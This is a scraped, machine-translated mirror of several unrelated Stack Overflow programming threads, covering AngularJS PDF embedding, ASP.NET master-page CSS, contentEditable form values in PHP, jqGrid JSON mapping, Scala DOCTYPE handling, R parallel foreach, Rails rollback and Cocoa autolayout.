这将推迟object元素的创建，直到我们实际上从范围中获得了可供我们使用的 URL（假设它已经存在 - 否则您会想要范围上$watch的src属性，直到它变得可用）。 这是一个小提琴。 于 2013-02-15T21:51:48.890 回答 This answer is useful 1 谢谢satchmorun，但如果 smb 想要更改链接而不重新加载页面或模式，您可以使用： 而这个指令： app.directive('pdf2', ['$compile', function ($compile) { return { restrict: 'E', scope: { src: "=", height: "=" }, link: function (scope, element, attr) { function update(url) { element.html('' + 'Для просмотра pdf:
Для Internet Explorer установите [Acrobat Reader](http://get.adobe.com/reader/)
' + 'Для Chrome: [Проверьте настройки](https://support.google.com/chrome/answer/6213030?hl=ru)' + ''); $compile(element.contents())(scope); } scope.$watch('src', update); } }; }]); 从这个答案和重新编译动态加载指令的示例中感谢Jerry 。 ps "pdfUrl" 和 "heightForPDF" 在范围内是可变的 于 2019-09-10T09:37:05.207 回答 This answer is useful 0 浏览器尝试在 AngularJS 用浏览器可以使用的东西替换 angulary 表达式之前处理这个东西，从而导致错误。 添加ng-cloak解决问题。 于 2018-03-21T09:26:14.217 回答 Related 1 objective-c - 我在哪里可以找到 Objective-C 2.0 的 EBNF 语法 3 android - Android - 包含多行文本视图的列表视图行 2 php - 使用参数将 Laravel 任务添加到 cron 1 format - Uncrustify 以对齐级联的“如果条件” 2 c# - 绑定一些引用的对象属性 1 iphone - 触摸事件方法没有在 ipad 的 UIPopOverViewController 中调用？ 3 php - Renderpartial() 不要为 AjaxSubmitButton 生成新的 Jquery 代码 0 c# - 使用 C# 显示 Flash 图像的缩略图 1 dynamics-nav - Navision 三层架构可以在没有 Kerberos 的情况下工作吗？ 0 java - Maven 中 Trove 2 和 Trove 3 的同时依赖关系 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：14903112
> 
> 赞同：19
> 
> 时间：
> 
> 标签：javascript, html, angularjs

I have a scope like `$scope.doc_details` in my angularjs controller, and I want to use it to display a pdf file by using a tag, like this:

```
<object data="{{doc_details.file_url}}" type="application/pdf"></object> 
```

but it doesn't get loaded in the browser, in my chrome console, all I see is:

```
Failed to load resource: the server responded with a status of 404 (Not Found) 
http://localhost/%7B%7Bdoc_details.file_url%7D%7D 
```

and when I just display it using `<span>{{doc_details.file_url}}</span>` it show the value.

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2014-02-13T11:10:54.360

从[AngularJS 1.1.4](https://github.com/angular/angular.js/blob/master/CHANGELOG.md#114-quantum-manipulation-2013-04-03)开始，您可以使用属性的`ng-attr-`前缀：`data`

```
<object ng-attr-data="{{doc_details.file_url}}" type="application/pdf"></object> 
```

请参阅AngularJS 上**`ngAttr`的绑定到任意属性**部分[：插值和数据绑定](https://docs.angularjs.org/guide/interpolation)。

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2013-02-15T21:51:48.890

这里的问题是浏览器正在查看

```
<object data="{{doc_details.file_url}}" type="application/pdf"></object> 
```

在 Angular 编译之前在 DOM 中，显然`{{doc_details.file_url}}`不是有效的 URL。

指令在这里可以成为你的朋友。

假设我们要写：

```
<pdf src='doc_details.file_url'></pdf> 
```

我们可以创建一个指令：

```
app.directive('pdf', function() {
    return {
        restrict: 'E',
        link: function(scope, element, attrs) {
            var url = scope.$eval(attrs.src);
            element.replaceWith('<object type="application/pdf" data="' + url + '"></object>');
        }
    };
}); 
```

这将推迟`object`元素的创建，直到我们实际上从范围中获得了可供我们使用的 URL（假设它已经存在 - 否则您会想要范围上`$watch`的`src`属性，直到它变得可用）。

[这是一个小提琴](http://jsfiddle.net/f8KgA/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-09-10T09:37:05.207

谢谢**satchmorun**，但如果 smb 想要更改链接而不重新加载页面或模式，您可以使用：

```
<pdf2 src="pdfUrl" height="heightForPDF"></pdf2> 
```

而这个指令：

```
app.directive('pdf2', ['$compile', function ($compile) {
    return {
        restrict: 'E',
        scope: {
            src: "=",
            height: "="
        },
        link: function (scope, element, attr) {
            function update(url) {
                    element.html('<object data="' + url + '" type="application/pdf" width="100%" style="height: ' + scope.height + 'px">' +
                        'Для просмотра pdf:<br /> Для Internet Explorer установите <a target="_blank" href="http://get.adobe.com/reader/">Acrobat Reader</a><br />' +
                        'Для Chrome: <a target="_blank" href="https://support.google.com/chrome/answer/6213030?hl=ru">Проверьте настройки</a>' +
                        '</object>');
                    $compile(element.contents())(scope);
            }
            scope.$watch('src', update);
        }
    };
}]); 
```

从这个[答案](https://stackoverflow.com/a/29902376/9589516)和重新编译动态加载指令的示例中感谢**Jerry 。**

ps "pdfUrl" 和 "heightForPDF" 在范围内是可变的

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-21T09:26:14.217

浏览器尝试在 AngularJS 用浏览器可以使用的东西替换 angulary 表达式之前处理这个东西，从而导致错误。

添加`ng-cloak`解决问题。

# asp.net - 页眉未显示，但页脚在 asp.net 中

> ID：14903120
> 
> 赞同：0
> 
> 时间：2013-02-15T20:50:44.073
> 
> 标签：asp.net, css, header, footer, master-pages

我以前没有太多使用 site.master 或 site.css 的经验，所以我不知道哪里出错了。

我在我的应用程序中设置了页脚和页眉，在设计视图中一切正常。但是当我在本地调试它时，标题没有显示；而页脚可以。

谁能帮我。

谢谢！

html:

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
 <head id="Head1" runat="server">
    <title></title>
    <link href="~/Styles/Site.css" rel="stylesheet" type="text/css" />
    <asp:ContentPlaceHolder ID="HeadContent" runat="server">
    </asp:ContentPlaceHolder>
</head>
<body>
<form id="Form1" runat="server">
<div class="page">
    <div class="header">
        <div class="title">
            <h1>
                My ASP.NET Application
            </h1>
        </div>
        <div class="loginDisplay">
            <asp:LoginView ID="HeadLoginView" runat="server" EnableViewState="false">
                <AnonymousTemplate>
                    [ <a href="~/Account/Login.aspx" ID="HeadLoginStatus" runat="server">Log In</a> ]
                </AnonymousTemplate>
                <LoggedInTemplate>
                    Welcome <span class="bold"><asp:LoginName ID="HeadLoginName" runat="server" /></span>!
                    [ <asp:LoginStatus ID="HeadLoginStatus" runat="server" LogoutAction="Redirect" LogoutText="Log Out" LogoutPageUrl="~/"/> ]
                </LoggedInTemplate>
            </asp:LoginView>
        </div>
        <div class="clear hideSkiplink">
            <asp:Menu ID="NavigationMenu" runat="server" CssClass="menu" EnableViewState="false" IncludeStyleBlock="false" Orientation="Horizontal">
                <Items>
                    <asp:MenuItem NavigateUrl="~/Default.aspx" Text="Home"/>
                    <asp:MenuItem NavigateUrl="~/About.aspx" Text="About"/>
                </Items>
            </asp:Menu>
        </div>
    </div>
    <div class="main">
        <asp:ContentPlaceHolder ID="MainContent" runat="server"/>
    </div>
    <div class="clear">
    </div>
</div>
<div class="footer" style="clear: both; text-align:center ; padding: 30px; background-color:Olive; border: 0px solid #DBDDDE; color:White ">
    Copyright 2013 IndieRevo
</div>
</form>
</body>
</html> 
```

输出：

```
 Line 1: error: expected identifier or '(' before '{' token
 Line 1: error: stray '@' in program
 Line 3: error: expected identifier or '(' before '<' token 
```

网站.css：

[http://codepad.org/vcCs4AN9](http://codepad.org/vcCs4AN9)

CSS：

```
body   
{
background: #b6b7bc;
font-size: .80em;
font-family: "Helvetica Neue", "Lucida Grande", "Segoe UI", Arial, Helvetica, Verdana, sans-serif;
margin: 0px;
padding: 0px;
color: #696969;
}

a:link, a:visited
{
color: #034af3;
}

a:hover
{
color: #1d60ff;
text-decoration: none;
}

a:active
{
color: #034af3;
}

p
{
margin-bottom: 10px;
line-height: 1.6em;
} 
```

/* 标题
------------------------------------------------------------ ------------*/

```
 h1, h2, h3, h4, h5, h6
{
font-size: 1.5em;
color: #666666;
font-variant: small-caps;
text-transform: none;
font-weight: 200;
margin-bottom: 0px;    
background-image: url('/Images/utensilsheader.png');
}

test
{
background-image: url(../images/1.png);
position: relative;
margin: 0px;
padding: 0px;

width: auto;
height: 255px;
top: 0px;
left: 1px;
}

h1
{
font-size: 1.6em;
padding-bottom: 0px;
margin-bottom: 0px;

background-image: url('/Images/utensilsheader.png');
}

h2
{
font-size: 1.5em;
font-weight: 600;

background-image: url('/Images/utensilsheader.png');
}

h3
{
font-size: 1.2em;

background-image: url('/Images/utensilsheader.png');
}

h4
{
font-size: 1.1em;

background-image: url('/Images/utensilsheader.png');
}

h5, h6 
```

{字体大小：1em；

```
background-image: url('/Images/utensilsheader.png');
} 
```

/* 此规则样式和标签是左右表列的第一个子项 */

```
 .rightColumn > h1, .rightColumn > h2, .leftColumn > h1, .leftColumn > h2
{
margin-top: 0px;
} 
```

/* 主要布局元素
--------------------------------------------------------- -------------*/

```
 .page
{
width: 1080px;
background-color: White;
margin: 20px auto 0px auto;
border: 1px solid #496077;
}

.header
{
position: relative;
margin: 0px;
padding: 0px;
background-image: url('/Images/utensilsheader.png');

width: auto;
height: 255px;
top: 0px;
left: 1px;
}

.header h1
{
font-weight: 700;
margin: 0px;
padding: 0px 0px 0px 20px;
color: #f9f9f9;
border: none;
line-height: 2em;
font-size: 2em; 
```

}

```
.main
{
padding: 0px 12px;
margin: 12px 8px 8px 8px;
min-height: 420px;
}

 .leftCol
{
padding: 6px 0px;
margin: 12px 8px 8px 8px;
width: 200px;
min-height: 200px;
}

.footer
{
color: #4e5766;
padding: 8px 0px 0px 0px;
margin: 0px auto;
text-align: center;
line-height: normal;

 } 
```

/* 选项卡菜单
---------------------------------------------- ------------*/

```
 div.hideSkiplink
{
background-color:#3a4f63;
width:100%;
display:none;

 }

 div.menu
{
padding: 4px 0px 4px 8px;
display:none;

}

div.menu ul
{
list-style: none;
margin: 0px;
padding: 0px;
width: auto;

}

div.menu ul li a, div.menu ul li a:visited
{
background-color: White;
border: 1px #4e667d solid;
color: #dde4ec;
display: block;
line-height: 1.35em;
padding: 4px 20px;
text-decoration: none;
white-space: nowrap;

}

div.menu ul li a:hover
{
background-color: #bfcbd6;
color: #465c71;
text-decoration: none;

}

div.menu ul li a:active
{
background-color: #465c71;
color: #cfdbe6;
text-decoration: none;

} 
```

/* 表单元素
---------------------------------------------- ------------*/

```
fieldset
{
margin: 1em 0px;
padding: 1em;
border: 1px solid #ccc;
}

fieldset p 
{
margin: 2px 12px 10px 10px;
 }

fieldset.login label, fieldset.register label, fieldset.changePassword label
{
display: block;
 }

fieldset label.inline 
{
display: inline;
}

legend 
{
font-size: 1.1em;
font-weight: 600;
padding: 2px 4px 8px 4px;
}

input.textEntry 
{
width: 320px;
border: 1px solid #ccc;
}

input.passwordEntry 
{
width: 320px;
border: 1px solid #ccc;
}

div.accountInfo
{
width: 42%;
} 
```

/* MISC
----------------------------------------------------------- ------------*/

```
.clear
{
clear: both;
}

.title
{
display: none;
float: left;
text-align: left;
width: auto;
}

.loginDisplay
{
font-size: 1.1em;
display: block;
text-align: right;
padding: 10px;
color: White;
}

.loginDisplay a:link
{
color: white;
 }

.loginDisplay a:visited
{
color: white;
}

 .loginDisplay a:hover
{
color: white;
}

.failureNotification
{
font-size: 1.2em;
color: Red;
 }

.bold
{
font-weight: bold;
}

 .submitButton
{
text-align: right;
padding-right: 10px;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:23:13.993

这是其中一个错误 - h1 颜色是白色。这就是为什么您无法在白色背景中看到它。

这是您在浏览器中调试的方式。FireFox 有 FireBug。

我希望这能帮助你继续前进。

在 IE 中调试 ![在此处输入图像描述](../Images/176baabfe37d49e7e070c0cc74196b7d.png)

在 Chrome 中调试 ![在此处输入图像描述](../Images/b1e2d09c491bb296052491083f45f223.png)

# javascript - 有没有办法防止使用 javascript 检测电子邮件

> ID：14903127
> 
> 赞同：0
> 
> 时间：2013-02-15T20:51:04.877
> 
> 标签：javascript, email, detect

我将尽力描述这一点。我有一个用户填写的表格，当它确认用户信息时，它会在表格上打印出来，用户可以使用竞争编辑属性直接在表格上编辑它。我遇到的问题是，如果用户编辑他/她的电子邮件地址，浏览器会将其检测为电子邮件地址（因为它不在输入元素中）并且不会通过表单传递电子邮件。所有其他值都很好。我正在使用 PHP 处理表单并打印出字段以确保它正确通过。

确认页面应该是这样的：

```
John,Smith,JSMITH,abc@123.com,111-222-3345 
```

但它看起来像这样：

```
John,Smith,JSMITH,null,111-222-3345 
```

有什么建议么？

如果我发布我的代码会更容易，所以这里是：

HTML：

```
<html>
  <head>
    <script type = "text/javascript" src = "ext.js"></script>
  </head>
  <body>
    <form name = "setupForm" id = "setupForm" action = "confirmSetup.php" method = "post">
      <div id = "confirmInfo"></div>
      <div id = "hiddenFields"></div>
    </form>
  </body>
</html>

/* I didn't put my full code on here as it is way too long.
   But this HTML document is what is shown after input fields 
   have been previously submit, and this page is just to confirm 
   the user input.
*/ 
```

JS：

```
function verifyInfo(){ // This function is called when user submits all his info
  var firstname = document.getElementById("txtFirstname").value;
  var lastname = document.getElementById("txtLastname").value;
  var username = document.getElementById("hdnUsername").value;
  var email = document.getElementById("txtEmail").value;
  var phone = document.getElementById("txtPhone").value;
  var output = "";
  output += "<table id = 'confirm'>";
  output += "<tr>";
  output += "  <th>Firstname</th>";
  output += "  <td id = 'tdFirstname'>";
  output += "    <div onkeyup = 'updateUsername()' contentEditable>" + firstname + "</div>";
  output += "  </td>";
  output += "</tr>";
  output += "<tr>";
  output += "  <th>Lastname</th>";
  output += "  <td id = 'tdLastname'>";
  output += "    <div onkeyup = 'updateUsername()' contentEditable>" + lastname + "</div>";
  output += "  </td>";
  output += "</tr>";
  output += "<tr>";
  output += "  <th>Username</th>";
  output += "  <td id = 'tdUsername'>" + username + "</td>";
  output += "</tr>";
  output += "<tr>";
  output += "  <th>Email</th>";
  output += "  <td id = 'tdEmail'>";
  output += "    <div style = 'min-width:1px;' onkeyup = 'verifyEmail(this.parentNode.id,event)' contentEditable>" + email + "</div>";
  output += "    <div id = 'validInvalid'>";
  output += "      <span class = 'dgreen'><br/>Valid email!</span>";
  output += "    </div>";
  output += "  </td>";
  output += "</tr>";
  output += "<tr>";
  output += "  <th>Phone</th>";
  output += "  <td id = 'tdPhone'>";
  output += "    <div style = 'min-width:1px;' onkeyup = 'verifyPhone(this.parentNode.id,event)' contentEditable>" + phone + "</div>";
  output += "    <div id = 'validInvalid1'>";
  output += "      <span class = 'dgreen'><br/>Valid phone!</span>";
  output += "    </div>";
  output += "  </td>";
  output += "</tr>";
  output += "</table>";
  output += "<input type = 'button' name = 'submitSetup' id = 'submitSetup' value = 'Get Set Up!' onclick = 'goToConfirm()'/>";
  document.getElementById("confirmInfo").innerHTML = output;
}

/* The way that function works is it takes the inputted text,
   and places it into the table. This table enables the user to dynamically make any
  changes necessary right onto the table. The username is created from first initial
  and last name, which is called on the 'updateUsername()' function, which I am leaving
  out.
*/

function verifyEmail(id,e){
  var unicode = e.charCode ? e.charCode : e.keyCode;
  if((unicode < 37 || unicode > 40) && unicode != 9){ // This doesn't allow email to be verified if the arrow keys, or tab key is pressed
    var email = document.getElementById(id).firstChild.firstChild.nodeValue;
    var emailFilter = /^[^0-9][A-z0-9_]+([.]A-z0-9_]+)*[@][A-z0-9_]+([.][A-z0-9_]+)*[.][A-z]{2,4}$/;
    if(!emailFilter.test(email)){ // Checks if valid email
      document.getElementById("validInvalid").innerHTML = "<span class = 'red'><br/>Not a valid email!</span>";
    }else{
      document.getElementById("validInvalid").innerHTML = "<span class = 'dgree'><br/>Valid email!</span>";
    }
  }
  disableButton(); //If email or phone is invalid, button will be disabled
}

function verifyPhone(id,e){
  var unicode = e.charCode ? e.charCode : e.keycode;
  if((unicode < 37 || unicode > 40) && unicode != 9)){
    var phone = document.getElementById(id).firstChild.firstChild.nodeValue;
    if(phone.length > 12){ // Doesn't let user put it more than 12 characters (xxx-xxx-xxxx)
      var difference = phone.length - 12;
      phone = phone.substr(0,phone.length - difference);
      document.getElementById(id).firstChild.firstChild.nodeValue = phone;
    }
    var phoneFilter = /\d{3}\-\d{3}\-\d{4}/;
    if(!phoneFilter.test(phone)){ // Checks for valid phone number
      document.getElementById("validInvalid1").innerHTML = "<span class = 'red'><br/>Not a valid phone!</span>";
    }else{
      document.getElementById("validInvalid1").innerHTML = "<span class = 'dgreen'><br/>Valid phone!</span>";
    }
  }
  disableButton();
}

function disableButton(){
  var email = document.getElementById("tdEmail").firstChild.nextSibling.firstChild.className;
  var phone = document.getElementById("tdPhone").firstChild.nextSibling.firstsChild.className;
  if(email == "red" || phone == "red"){
    document.getElementById("submitSetup").disabled = true;
  }else{
    document.getElementById("submitSetup").disabled = false;
  }
}

function goToConfirm(){ //This is the function that goes to confirmsetup.php. it works fine if email isn't edited in table, but if email is edited, it doesn't work
  var firstname = document.getElementById("tdFirstname").firstChild.firstChild.nodeValue;
  var lastname = document.getElementById("tdLastname").firstChild.firstChild.nodeValue;
  var username = document.getElementById("tdUsername").firstChild.nodeValue;
  var email = document.getElementById("tdEmail").firstChild.firstChild.nodeValue;
  var phone = document.getElementById("tdPhone").firstChild.firstChild.nodeValue;
  var hiddenfields = document.getElementById("hiddenFields");
  var input = "<input type = 'hidden' name = 'hdnFirstname' id = 'hdnFirstname' value = '"+firstname+"'/>";
     input += "<input type = 'hidden' name = 'hdnLastname' id = 'hdnLastname' value = '"+lastname+"'/>";
     input += "<input type = 'hidden' name = 'hdnUsername' id = 'hdnUsername' value = '"+username+"'/>";
     input += "<input type = 'hidden' name = 'hdnEmail' id = 'hdnEmail' value = '"+email+"'/>";
     input += "<input type = 'hidden' name = 'hdnPHone' id = 'hdnPhone' value = '"+phone+"'/>";
  hiddenFields.innerHTML = input;
  document.setupForm.submit();
}

/* That is the end of my javascript file, it's a lot,
   but hopefully you can understand it
*/ 
```

最后，最终的 php 脚本很简单：

```
<?php

$fn = $_POST['hdnFirstname'];
$ln = $_POST['hdnLastname'];
$un = $_POST['hdnUsername'];
$em = $_POST['hdnEmail'];
$ph = $_POST['hdnPhone'];

die($fn.",".$ln.",".$un.",".$em.",".$ph);

?> 
```

名字、姓氏、用户名和电话总是正确打印出来。当电子邮件未编辑时，它会正确打印，当电子邮件被编辑时，它会打印为空。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T20:55:59.193

这是不正确的，值被解析为文本。请检查代码并确保从 http 请求对象解析正确的表单名称。它应该可以解决您的问题。

# jquery - jqgrid json url不起作用

> ID：14903128
> 
> 赞同：0
> 
> 时间：2013-02-15T20:51:06.640
> 
> 标签：jquery, json, jqgrid

我对 Jquery 很陌生，因此在这方面需要您的帮助。

我正在尝试将 jqGrid 与 JSON url 一起使用，但无法使用它。htm 页面不显示任何数据。

```
$(function () {
    "use strict";
    $('#list').jqGrid({
        datatype: 'json',
        url: 'json_url',
        caption: 'Prospect Finder',
        gridview: true,
        height: "auto",
        colNames: ['Partner','First Name', 'Last Name', 'Organization'],
        colModel: [
            {name: 'PARTNER', jsonmap: 'PARTNER' },
            {name: 'NAME_FIRST',jsonmap: 'NAME_FIRST' },
            {name: 'NAME_LAST', jsonmap: 'NAME_LAST' },
            {name: 'NAME_ORG1', jsonmap: 'NAME_ORG1' }
        ],
        jsonReader: {
            repeatitems: false,
            id: "PARTNER",
            root: function (obj) {
                return obj;
            }
        }
    });
}); 
```

这是我的 JSON 数据

```
{"itab":[ { "PARTNER":"0061000220", "NAME_FIRST":"", "NAME_LAST":"", "NAME_ORG1":"GTA Central" }, { "PARTNER":"0061000221", "NAME_FIRST":"", "NAME_LAST":"", "NAME_ORG1":"GTA West" }, { "PARTNER":"0061000222", "NAME_FIRST":"", "NAME_LAST":"", "NAME_ORG1":"GTA East" }, { "PARTNER":"0041000141", "NAME_FIRST":"", "NAME_LAST":"", "NAME_ORG1":"Office Systems" }  ]} 
```

有人可以帮助我吗？

谢谢，DJ

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T10:47:04.903

您只需修复to的`root`属性。此外，包含一些足够大的值（如）也很重要。如果您不这样做并且不使用，那么 jqGrid 将仅显示来自服务器响应的前 20 行（默认值为20）并丢弃所有其他行。`jsonReader``root: "itab"``rowNum``rowNum: 10000``pager``rowNum`

[演示](http://www.ok-soft-gmbh.com/jqGrid/user1596433.htm)成功读取JSON数据并显示

![在此处输入图像描述](../Images/ba83b90a10c5fb0b6c07be8c4558a0e0.png)

它使用以下代码

```
$(function () {
    "use strict";
    $('#list').jqGrid({
        datatype: 'json',
        url: 'user1596433.json',
        caption: 'Prospect Finder',
        gridview: true,
        height: "auto",
        colNames: ['Partner','First Name', 'Last Name', 'Organization'],
        colModel: [
            {name: 'PARTNER', width: 80 },
            {name: 'NAME_FIRST' },
            {name: 'NAME_LAST' },
            {name: 'NAME_ORG1', width: 100 }
        ],
        jsonReader: {
            repeatitems: false,
            id: "PARTNER",
            root: "itab"
        },
        rowNum: 10000,
        autoencode: true,
        loadonce: true
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T00:08:38.007

查看文档。[http://www.trirand.com/jqgridwiki/doku.php?id=wiki:retrieving_data#json_data](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:retrieving_data#json_data) 您的 json 设置不正确。看

```
 { 
      "total": "xxx", 
      "page": "yyy", 
      "records": "zzz",
      "rows" : [
        {"id" :"1", "cell" :["cell11", "cell12", "cell13"]},
        {"id" :"2", "cell":["cell21", "cell22", "cell23"]},
          ...
      ]
    } 
```

这是默认格式（虽然您可以覆盖它但您仍然需要提供 id、total、page 和 records）

```
jsonReader: {
    repeatitems: false,
    id: "Id",
    root: function (obj) { return obj.itab; },
    page: function (obj) { return 1; },
    total: function (obj) { return 1; },
    records: function (obj) { return obj.itab.length; }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-03T07:43:40.837

我的经验是：

表卡在加载中，这意味着它已尝试从 url 检索，但无法处理它。

然后我意识到我的 json 与默认的 jsonReader 不兼容，解决方案是

1.设置jsonReader与你的json数据兼容

示例 json 数据：

```
{"page":1,"YOUR_ROW_NAME":[{"YOUR_ID":"14","YOUR_CELL_NAME":["ImageHeight"]}]} 
```

将以下内容添加到 javascript（其他键（即页面），也可以被覆盖）

```
jsonReader : { 
      root: "YOUR_ROW_NAME",  
      cell: "YOUR_CELL_NAME", 
      id: "YOUR_ID", 
}, 
```

2.谨慎使用默认jsonReader，编码数据时必须在方括号[]内使用"rows",'id','cell'

```
foreach($all as $row){
    $response->rows[$i]['id']=$row->id;
    $response->rows[$i]['cell']=array($row->id,$row->name,$row->url);
    $i++;
} 
```

对初学者有用的 wiki：[http ://www.trirand.com/jqgridwiki/doku.php?id=wiki:retrieving_data#json_data](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:retrieving_data#json_data)

# xml - 如何在 Scala 中获取 XML 文档的 DOCTYPE？

> ID：14903132
> 
> 赞同：2
> 
> 时间：2013-02-15T20:51:19.523
> 
> 标签：xml, scala, doctype

假设我们打开一个 XHTML 文件：

```
val parser = new XhtmlParser(io.Source.fromFile(filename))
val doc = parser.initialize.document 
```

可以获得文档的DTD `doc.dtd`：. 当我像下一行那样保存 XML 时，不会保存 DOCTYPE。

```
XML.save("out.xhtml", docRootElem, enc = "UTF-8", xmlDecl = true) 
```

我知道该`XML.save(...)`方法有一个参数`doctype: DocType`，但是如何从我刚刚打开的 XML 中获取它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T10:57:47.340

该`XML`对象具有具有以下签名的方法：

```
def loadXML(source: InputSource, parser: SAXParser): Elem 
```

这允许您提供一个`SaxParser`. 你可以给它`SaxParser`一个[`LexicalHandler`](http://docs.oracle.com/javase/1.5.0/docs/api/org/xml/sax/ext/LexicalHandler.html)具有以下签名的方法：

```
void startDTD(String name, String publicId, String systemId) 
```

你可以覆盖它。一个例子：

```
var  r = ("", "", "")                           

val handler = new DefaultHandler2 {
  override def startDTD(name:String, publicId:String, systemId:String) = {
    r = (name, publicId, systemId)
  }
}

val parser = SAXParserFactory.newInstance().newSAXParser()
parser.setProperty("http://xml.org/sax/properties/lexical-handler", handler)

val source = Source fromString """<?xml version="1.0"?>
<!DOCTYPE wikiarticle SYSTEM "wikiarticle.dtd">
    <wikiarticle>
        <art type="redirect">
            <redirect>#REDIRECT[[page]]</redirect>
        </art>
    </wikiarticle>
"""

XML.loadXML(source, parser)

println(r) // (wikiarticle,null,wikiarticle.dtd) 
```

为了运行你需要一个 dtd 的例子，你可以使用这个：

```
<!ELEMENT wikiarticle (art)>
<!ELEMENT art (redirect, redirect?, article?)>
<!ATTLIST art type CDATA #REQUIRED>
<!ELEMENT redirect (#PCDATA)>
<!ELEMENT article (#PCDATA)> 
```

# r - 在 Foreach 循环中修改变量？

> ID：14903133
> 
> 赞同：1
> 
> 时间：2013-02-15T20:51:20.277
> 
> 标签：r, foreach, parallel-processing

我正在尝试构建一个并行的 for-each 循环来修改两个矩阵。我在开始循环之前创建并初始化矩阵。这是一个虚拟程序，它演示了我的代码应该如何工作。程序执行没有错误，但在 foreach 循环完成后矩阵仍然为空。注意：这是我的代码的简化版本，而不是实际代码本身。

```
#Assume that I've loaded parallel and doParallel and that my computer has 2+ cores 
cluster <- makeCluster(detectCores())
registerDoParallel(cluster)
a1 <- array(dim=c(9,9))
a2 <- array(dim=c(9,9))
numbers <- 1:18
foreach (i=1:9, .combine='c') %dopar%{
    a1[i,] = numbers[1:9]
    a2[i,] = numbers[10:18]
}
stopCluster(cluster) 
```

为什么这个程序不填充 a1 和 a2 的行？

编辑：我在以前的任何线程中都找不到我的问题的答案。C# 和 Perl 有类似的线程，但没有一个与 R 相关。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T19:03:04.923

您不能使用 foreach 来执行这种副作用。循环中的分配发生在工作进程中，并且故意不发送回主进程。您对其返回值执行 foreach，因此如果要生成两个矩阵，foreach 应该返回两个矩阵的列表。

这是一个使用 combine 函数从工作人员生成的行列表中构造多个矩阵的示例：

```
rcomb <- function(...) {
  args <- list(...)
  lapply(seq_along(args[[1]]), function(i)
         do.call('rbind', lapply(args, function(a) a[[i]])))
}

numbers <- 1:18
m <- foreach (i=1:9, .combine='rcomb', .multicombine=TRUE) %dopar% {
    list(numbers[1:9], numbers[10:18])
} 
```

虽然`rcomb`有点复杂，但它可以处理任意数量的矩阵，并且可以调用许多任务结果，这对于效率来说很重要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:03:35.413

也许这有帮助。无法测试，请原谅错误。

```
 require(snowfall)

sfInit(cpus=2,parallel=TRUE)

a1 <- matrix(NA,ncol=9,nrow=0)
a2 <- matrix(NA,ncol=9,nrow=0)
numbers <- 1:18

a1 = rbind(a1,sfSapply(1:9,function(x) return(numbers[1:9]), numbers))
a2 = rbind(a2,sfSapply(1:9,function(x) return(numbers[10:18]), numbers))

sfStop() 
```

# ruby-on-rails - 当不在沙盒模式下启动时，是否可以在 Rails 控制台中手动回滚数据库？

> ID：14903134
> 
> 赞同：1
> 
> 时间：2013-02-15T20:51:20.743
> 
> 标签：ruby-on-rails, database, transactions, console, rollback

假设您正在控制台中工作，并且您删除了一条记录

```
belongs_to :model :dependent => :destroy 
```

例如，在您不打算这样做的地方，由于您的错误，您最终删除了其他记录。

如果您没有以 -sandbox 标志开始（因为您打算进行永久更改但意外出错），是否可以手动发出命令以将数据库回滚到控制台之前（或命令之前）的状态？

在我的特定环境中，我使用 PostgreSQL。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:09:11.607

不是真的，不。您没有提及您正在使用什么 DBMS，但通常一旦提交事务或者如果查询未包装在事务中，那么您将无法立即回滚或恢复数据。

如果可能，您应该从备份中恢复丢失的数据。

# cocoa - 在基于视图的 NSTableView 中使用 Cocoa 自动布局

> ID：14903135
> 
> 赞同：2
> 
> 时间：2013-02-15T20:51:26.047
> 
> 标签：cocoa, nstableview, nsview, autolayout

我的目标是创建一个表格视图，显示简短但可变长度和多行的带有图片的消息（例如推文列表）。我决定尝试对将添加到表中的视图使用自动布局，因为我希望从长远来看它会简化开发，但我遇到了布局约束问题。

我希望每个表格行视图都扩展高度以容纳文本内容，但具有固定宽度，即表格视图的全宽。只有在调整窗口大小时，这个固定宽度才会改变。

我仍在学习如何最好地使用自动布局，但很难理解它在这种情况下的工作方式。

表格视图是否需要明确给出每行的高度？如果是这样，这是在哪里完成的，如果不是，我如何强制视图正确调整大小以适应内容？

我`(CGFloat)tableView:heightOfRow:`以前在一个糟糕的解决方案中使用，没有自动布局，效果不好。如果我不需要给出高度，表格视图将如何获得高度来给出行？似乎 tableview 将我的自定义视图嵌入到另一个视图中，并且没有扩展以适应，但我不确定这一点。

我的视图层次结构大致如下：

```
 - Window
   - Custom titlebar
   - Scroll View
     - Table View
       - Row View (variable height)
         - Text View
       - Row View (variable height)
         - Text View
       - Row View (variable height)
         - Text View 
```

我希望我已经足够好地描述了这个问题，如果没有在评论中让我知道，我会添加更多细节或图表。

# maven-3 - 如果未设置本地存储库，maven 会在哪里下载资源？

> ID：14903141
> 
> 赞同：0
> 
> 时间：2013-02-15T20:52:16.567
> 
> 标签：maven-3

